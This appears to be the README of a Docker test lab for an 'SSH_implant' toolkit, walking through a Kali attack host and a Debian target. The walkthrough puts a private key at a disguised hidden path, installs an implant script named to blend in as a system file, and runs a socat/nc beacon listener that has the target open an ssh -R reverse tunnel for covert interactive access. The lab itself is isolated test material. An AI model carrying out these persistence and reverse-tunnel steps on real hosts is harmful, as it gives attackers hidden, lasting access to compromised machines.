# SSH_implant test lab

A local, fully isolated two-container lab for exercising this repo's scripts
end to end without touching real infrastructure. Both containers sit on a
private Docker bridge network (`172.30.0.0/24`) with **no ports published to
the host** — the only way in is `docker exec`.

- `attackhost` (Kali, `172.30.0.10`) — stands in for your attack box. This is
  where you run `chroot_setup.sh` and the CHK/CB beacon listener.
- `target` (Debian, `172.30.0.20`) — stands in for the compromised internal
  host. Ships with a `target_user` account (password `LabPassword123!`,
  lab-only, not a real credential) simulating an existing foothold.

The repo is bind-mounted read-only into both containers at
`/opt/SSH_implant`, so you're always testing the actual scripts in this
checkout, not a copy.

This walkthrough has been run end-to-end against this checkout: chroot setup,
key transfer, beacon check-in, reverse tunnel establishment (confirmed via
`sshd-session: user` on the attack host and a real SSH login through the tunnel to
target), and teardown all verified working.

**One thing this environment needs that a real deployment wouldn't:**

- **`sudo`** — if your user isn't in the `docker` group, prefix `docker`/
  `docker compose` commands with `sudo` (used throughout below).

`chroot_setup.sh` and the `Access`/`Exit` docs reload sshd's config via
`systemctl reload ssh` with fallbacks down to a direct `SIGHUP`, so they work
unmodified here even though these containers have no systemd (PID 1 is
`sshd -D` directly).

## 1. Bring the lab up

    cd lab
    sudo docker compose up -d --build

## 2. Set up the chroot jail on the attack host

    sudo docker exec -it implant-lab-attackhost bash
    bash /opt/SSH_implant/chroot_setup.sh

This creates the chroot user, generates the tunnel keypair at
`/home/chroot/id_rsa` (owned by whichever user ran the script, or `root` if
run directly as root — no hardcoded username), and appends the
`Match User user` block to `/etc/ssh/sshd_config`.

## 3. Move the private key onto target

From your host shell (not inside a container):

    sudo docker cp implant-lab-attackhost:/home/chroot/id_rsa /tmp/id_rsa
    sudo docker exec implant-lab-target mkdir -p /usr/lib/.cache
    sudo docker cp /tmp/id_rsa implant-lab-target:/usr/lib/.cache/.sysd
    rm /tmp/id_rsa
    sudo docker exec implant-lab-target chmod 600 /usr/lib/.cache/.sysd
    sudo docker exec implant-lab-target chown target_user:target_user /usr/lib/.cache/.sysd

(`/usr/lib/.cache/.sysd` is standing in for whatever "blend in" path
`Implant_Procedure` has you pick on a real target.)

## 4. Configure and place the implant script

    sudo docker exec -it implant-lab-target bash
    cp /opt/SSH_implant/Persistent/Implant_Script /usr/lib/.cache/.sysd-check
    chmod +x /usr/lib/.cache/.sysd-check

Edit `/usr/lib/.cache/.sysd-check` and set:

    REMUSR=user
    TARUSR=target_user
    TARSSH=22
    CHK_IPs="172.30.0.10"
    CHK_PORT=8443
    KEY="/usr/lib/.cache/.sysd"
    TRACK_FILE="/tmp/.sysd-lock"
    SLEEP=120

Use the literal IP, not the `attackhost` hostname: the beacon check runs
`nc -n`, and `-n` disables DNS resolution — it needs a numeric address, same
as a real `CHK_IP` would be.

To test `Non-Persistent/Implant_Script` instead, use the same variables
(plus `SLEEP1`/`SLEEP2` in place of `SLEEP`), and remember it also needs the
`encoded:` block's base64 placeholder filled in with the real base64 of
`/home/chroot/id_rsa.pub` from the attack host — see the note about that
placeholder in the main repo README/reviews.

## 5. Start the beacon listener (CHK_IP) on the attack host

    sudo docker exec -it implant-lab-attackhost bash
    cat <<'EOF' >/root/info.sh
    echo -n "22:172.30.0.10:2222"
    EOF
    chmod +x /root/info.sh
    socat -d -d TCP-LISTEN:8443,fork,reuseaddr system:/root/info.sh &
    sed -i 's/PubkeyAuthentication no #/PubkeyAuthentication yes #/' /etc/ssh/sshd_config
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || service sshd reload 2>/dev/null || kill -HUP "$(pgrep -o -x sshd)"

This tells target: call back on port 22 (the attack host's real sshd, reused here
as `CB_PORT`) to `172.30.0.10`, and expose the tunnel on port `2222`. The
`sed`/reload pair is exactly the "when ready to have an interactive shell"
step from `Persistent/Access` / `Non-Persistent/Access`.

## 6. Trigger the implant

    sudo docker exec -it implant-lab-target bash
    /usr/lib/.cache/.sysd-check &

Watch it beacon in — `ps -ef` on target should show the backgrounded `ssh -R`
process, and `ps -ef | grep sshd-session` on the attack host should show a new
session for `user`.

## 7. Continue from the existing procedure docs

From here, [`../Persistent/Access`](../Persistent/Access) or
[`../Non-Persistent/Access`](../Non-Persistent/Access) apply unmodified —
run their commands via `sudo docker exec -it implant-lab-attackhost bash`
instead of a real SSH session into a real attack host. Those docs already note
which host each step runs on (the `ps -efH` / `/proc/<pid>/fd` recovery step
runs in the shell you land in *through the tunnel*, i.e. on target, not via a
separate `docker exec` into the target container).

## Tear down

    sudo docker compose down -v
